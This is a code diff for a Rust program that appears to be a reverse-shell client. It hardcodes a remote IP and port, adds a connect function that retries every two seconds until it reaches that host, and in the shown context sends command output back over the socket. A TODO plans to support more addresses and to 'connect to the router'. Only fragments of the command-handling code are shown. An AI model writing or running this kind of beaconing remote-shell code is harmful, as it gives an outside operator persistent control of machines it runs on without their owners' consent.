@@ -10,9 +10,22 @@ use std::env::set_current_dir;
 
 //TODO 
 //Implement multiple IP addresses and ports (eventually connect to the router)
-//Implement CD
-//Implement connect function that always tries to connect then returns a socket
 //Refactor
+
+fn connect(ip: &str) -> TcpStream {
+    loop {
+        match TcpStream::connect(ip){
+            Ok(con) => {
+                return con;
+            },
+            Err(_) => {
+                // println!("trying to connect");
+                thread::sleep(time::Duration::from_millis(2000));
+                continue;
+            }
+        } 
+    }
+}
 
 fn main() {
     let ip = "129.21.49.57:5678";
@@ -59,25 +72,4 @@ fn main() {
         stream.write(&stderrout.as_bytes()).unwrap(); //send that shit
     }
     // stream.shutdown(Shutdown::Both).expect("shutdown call failed");
-}
-    
-    // fn sendCommand(cmd: &str, stream: &TcpStream){
-        //     //if it's windows, run command with cmd /c
-        //     //if it's not windows, run sh -c
-        //     true;
-        // }
-        
-        fn connect(ip: &str) -> TcpStream {
-    loop {
-        match TcpStream::connect(ip){
-            Ok(con) => {
-                return con;
-            },
-            Err(_) => {
-                println!("trying to connect");
-                thread::sleep(time::Duration::from_millis(2000));
-                continue;
-            }
-        } 
-    }
-}
+}       
